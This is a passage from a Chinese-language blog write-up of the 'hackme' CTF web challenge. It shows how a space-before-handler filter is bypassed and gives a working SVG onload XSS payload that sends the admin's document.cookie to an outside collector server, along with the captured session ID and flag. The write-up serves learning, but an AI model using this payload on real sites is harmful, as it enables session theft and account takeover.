srcset="/posts/ctf-hackme-web-write-up/38/1_hu8ad9fc98707753d1952778711004080a_646771_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/1_hu8ad9fc98707753d1952778711004080a_646771_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/1_hu8ad9fc98707753d1952778711004080a_646771_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/1_hu8ad9fc98707753d1952778711004080a_646771_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/1_hu8ad9fc98707753d1952778711004080a_646771_660x0_resize_box_3.png alt style=width:100%></figure></p><p>點擊右上角的<code>register</code>後，可以看到這些欄位：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/2_huc6807cd1a22521b7e3c53d65fc067f14_23579_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/2_huc6807cd1a22521b7e3c53d65fc067f14_23579_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/2_huc6807cd1a22521b7e3c53d65fc067f14_23579_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/2_huc6807cd1a22521b7e3c53d65fc067f14_23579_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/2_huc6807cd1a22521b7e3c53d65fc067f14_23579_660x0_resize_box_3.png alt style=width:100%></figure></p><p>可以看到密碼寫著「<code>Your login password, will NOT be protected properly.</code>」，也就是說會以明文的方式存放。<br>不確定這裡算不算攻擊點，總之先註冊一個帳號試試。</p><p>註冊完後登入，可以看到上方多了幾個功能：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/3_hu64f7913e11bb63af5234dbfefd20a6cb_6414_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/3_hu64f7913e11bb63af5234dbfefd20a6cb_6414_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/3_hu64f7913e11bb63af5234dbfefd20a6cb_6414_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/3_hu64f7913e11bb63af5234dbfefd20a6cb_6414_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/3_hu64f7913e11bb63af5234dbfefd20a6cb_6414_660x0_resize_box_3.png alt style=width:100%></figure></p><p>看來就是需要寄送一封帶有<code>XSS</code>的信件給管理員了，點擊<code>Send Mail</code>，先嘗試寄送一則測試郵件：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/4_huafbd580f846a9fd8e230d63c14becc98_32041_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/4_huafbd580f846a9fd8e230d63c14becc98_32041_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/4_huafbd580f846a9fd8e230d63c14becc98_32041_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/4_huafbd580f846a9fd8e230d63c14becc98_32041_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/4_huafbd580f846a9fd8e230d63c14becc98_32041_660x0_resize_box_3.png alt style=width:100%></figure></p><p>下方只是個模擬驗證功能，按下「<code>I'm a robot</code>」即可。(<del>我還以為是題目</del>)</p><p>可以在「<code>Sent Mail</code>」看到已送出的信件：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/5_hu7405aba28633241102cda5c788492499_15904_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/5_hu7405aba28633241102cda5c788492499_15904_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/5_hu7405aba28633241102cda5c788492499_15904_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/5_hu7405aba28633241102cda5c788492499_15904_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/5_hu7405aba28633241102cda5c788492499_15904_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><p>開始隨便嘗試一些語法：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/6_hu41499f2bcf0770b4bd3a5a02c6b1755a_46510_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/6_hu41499f2bcf0770b4bd3a5a02c6b1755a_46510_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/6_hu41499f2bcf0770b4bd3a5a02c6b1755a_46510_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/6_hu41499f2bcf0770b4bd3a5a02c6b1755a_46510_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/6_hu41499f2bcf0770b4bd3a5a02c6b1755a_46510_660x0_resize_box_3.png alt style=width:100%></figure></p><p>發現「<code>)</code>」與「<code>onerror</code>」都被擋了，後續也嘗試許多都被阻擋。<br>但仔細看可以發現，它所阻擋的並非是<code>onerror</code>，而是前面有多個空格。</p><p>我們可以在前方加個斜線<code>/</code>取代空格，這算是一個<code>html</code>的特性，同理<code>onload</code>也是如此。</p><hr><p>我們的目的是獲得管理員的身份，偷取他的<code>session</code>。<br>我們可以自己架設伺服器來接收等等<code>xss</code>讓管理員送出的請求，又或者線上有許多服務可以幫你代收請求。<br>(例子所使用的服務是<code>hookb.in</code>)</p><p>經過嘗試後，發現可用的 payload 如下(<code>https://your-server.com</code>為用於接收及紀錄請求的伺服器)：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>&lt;<span style=color:#ff6ac1>svg</span><span style=color:#ff5c57>/</span><span style=color:#57c7ff>onload</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;self.location=&#39;https://your-server.com/?x=&#39;+document.cookie&#34;</span>&gt;
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/38/7_huae3e836c1c289368d0a17844b15ac109_40359_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/38/7_huae3e836c1c289368d0a17844b15ac109_40359_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/38/7_huae3e836c1c289368d0a17844b15ac109_40359_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/38/7_huae3e836c1c289368d0a17844b15ac109_40359_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/38/7_huae3e836c1c289368d0a17844b15ac109_40359_660x0_resize_box_3.png alt style=width:100%></figure></p><p>接著等待管理者打開信件，在 server 上就可以收到請求「<code>x: PHPSESSID=8atmu7fv1qee87g0vckelq13o3; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability &lt;script>alert(1)&lt;/script>}; FLAG_2=IN_THE_REDIS</code>」。</p><p>Flag <code>FLAG{Sometimes, XSS can be critical vulnerability &lt;script>alert(1)&lt;/script>}</code>。</p><hr></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt=Alpaca src=/img/avatar_hu0d3ed4aea410af91b5b138cbaef7f875_186486_192x192_fill_q75_box_center.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">作者</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Alpaca</div><div class="text-sm text-neutral-700 dark:text-neutral-400">No one can stop my feet.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/alpaca0x0 target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://instagram.com/alpaca0x0 target=_blank aria-label=Instagram rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M224.1 141c-63.6.0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1.0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9.0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9.0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9.0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9.0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8.0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg></span></span></a></div></div></div></div><div class=mb-10></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;title=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title="分享到 LinkedIn" aria-label="分享到 LinkedIn"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;text=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title="推到 Twitter" aria-label="推到 Twitter"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;resubmit=true&amp;title=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title="發送到 Reddit" aria-label="發送到 Reddit"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;description=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title="釘到 Pinterest" aria-label="釘到 Pinterest"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M496 256c0 137-111 248-248 248-25.6.0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8.0 128.7-68.8 128.7-154.3.0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1.0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6.0-54.7 41.4-107.6 112-107.6 60.9.0 103.6 41.5 103.6 100.9.0 67.1-33.9 113.6-78 113.6-24.3.0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6.0-19-10.2-34.9-31.4-34.9-24.9.0-44.9 25.7-44.9 60.2.0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9.0 361.1.0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;quote=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title="分享到 Facebook" aria-label="分享到 Facebook"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;subject=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title=以電子郵件發送 aria-label=以電子郵件發送><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;resubmit=true&amp;title=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title aria-label><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://t.me/share/url?url=https://blog.alpaca.tw/posts/ctf-hackme-web-write-up/&amp;resubmit=true&amp;title=CTF%20%e3%80%8chackme%e3%80%8dWeb%20Write%20Up" title aria-label><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></section><h2 class="mt-8 text-2xl font-extrabold mb-10">相關文章</h2><section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3"><a href=/posts/mysql-8-change-root-password/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/mysql-8-change-root-password/cover_hu2e351b46d04056d998bc505c212e247d_64215_600x0_resize_q75_box.jpg)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/mysql-8-change-root-password/>Change root password in MySQL 8</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-01-29 16:46:05 +0000 UTC">2022/01/29</time><span class="px-2 text-primary-500">&#183;</span><span>136 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/MySQL-8-Change-Root-Password/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=likes_posts/MySQL-8-Change-Root-Password/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=likes>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M47.6 300.4 228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6.0 115.2.0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span></span></div><div class="flex flex-row flex-wrap items-center"></div><div class="flex flex-row flex-wrap items-center"><span style=margin-top:.5rem class=mr-2 onclick='window.open("/categories/computer-science/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Computer-Science
</span></span></span><span style=margin-top:.5rem class=mr-2 onclick='window.open("/tags/mysql/","_self")'><span class=flex style=cursor:pointer><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">MySQL</span></span></span></div></div><div class="py-1 prose dark:prose-invert"><p>Change the password of root in mysql version 8</p></div></div><div class="px-6 pt-4 pb-2"></div></div></a><a href=/posts/ubuntu-move-home-to-new-disk/ class=min-w-full><div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative"><div class="w-full thumbnail_card_related nozoom" style=background-image:url(/posts/ubuntu-move-home-to-new-disk/cover_hu14da0415d2490017d2db19e07aaa462b_51654_600x0_resize_box_3.png)></div><div class="px-6 py-4"><div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral" href=/posts/ubuntu-move-home-to-new-disk/>Ubuntu 更換 /Home 到新硬碟</div><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2022-01-27 13:26:21 +0000 UTC">2022/01/27</time><span class="px-2 text-primary-500">&#183;</span><span>1364 字</span><span class="px-2 text-primary-500">&#183;</span><span>
<span id=views_posts/Ubuntu-Move-Home-To-New-Disk/index.md class="animate-pulse inline-block text-transparent max-h-3 rounded-full mt-[-2px] align-middle bg-neutral-300 dark:bg-neutral-400" title=views>loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentcolor" d="M288 32c-80.8.0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7.0 24.6C17.3 304 48.6 356 95.4 399.4 142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1 3.3-7.9 3.3-16.7.0-24.6-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144 64.5-144 144-144 144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64-11.5.0-22.3-3-31.6-8.4-.2 2.8-.4 5.5-.4 8.4.0 53 43 96 96 96s96-43 96-96-43-96-96-96c-2.8.0-5.6.1-8.4.4 5.3 9.3 8.4 20.1 8.4 31.6z"/></svg>
</span></span></span><span class="px-2 text-primary-500">&#183;</span><span>
